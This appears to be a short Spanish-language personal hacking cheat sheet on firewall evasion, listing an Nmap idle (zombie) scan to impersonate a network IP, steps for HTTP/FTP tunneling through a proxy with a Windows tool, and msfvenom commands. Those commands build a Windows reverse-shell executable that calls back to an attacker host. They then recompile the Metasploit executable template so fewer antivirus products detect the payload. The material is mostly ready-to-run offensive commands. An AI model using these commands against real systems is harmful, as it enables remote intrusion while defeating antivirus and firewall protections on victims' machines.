# Técnicas de evasión de Firewall 

Tags: #Hacking #EvasionTechniques #Firewall 

## Nmap 

```bash 
# Kali Tool
❯ nmap -sI IP_red IP_Target          # Escaneo Zombie para impersonar una IP de la red 
```

## HTTP/FTP Tunneling  

```bash 
# Windows Tool
❯ httport3snfm.exe             # Ejecutar el programa 

Nota:
	1. En la pestaña de 'Proxy' colocar la IP y el puerto 
	2. En 'Bypass mode' seleccionar 'Remote host' y agregar la IP, puerto y password 
	3. En la pestaña de 'Port mapping' dar click en 'Add' y en 'New mapping' click derecho para cambiarle el nombre 
	4. Editar 'Local Port, Remote hosts y Remote port'
	5. En la pestaña de 'Proxy' dar click en 'Start'

Nota2:
	1. En un 'cmd' colocar el siguiente comando:
		❯ ftp 127.0.0.1          # Concectar a FTP por el tunel creado  
```

## Metasploit 

```bash 
# Kali Tool 
# Crear un payload y despues ofuscar para que menos AV lo detecten 
❯ msfvenom -p windows/shell_reverse_tcp lhost=IP lport=443 -f exe > /home/kali/Windows.exe   

❯ nano /usr/share/metasploit-framework/data/templates/src/pe/exe/Template.c    # Editar el archivo  
	1. Cambiar el tamaño del 'payload a 4000'
	2. En esa ruta ejecutar lo siguiente:
		❯ i686-w64-mingw32-gcc tamplate.c -lws2_32 -o evasion.exe    # Compilar 

❯ msfvenom -p windows/shell_reverse_tcp lhost=IP lport=443 -x /usr/share/metasploit-framework/data/templates/src/pe/exe/evasion.exe -f exe > /home/kali/bypass.exe 
```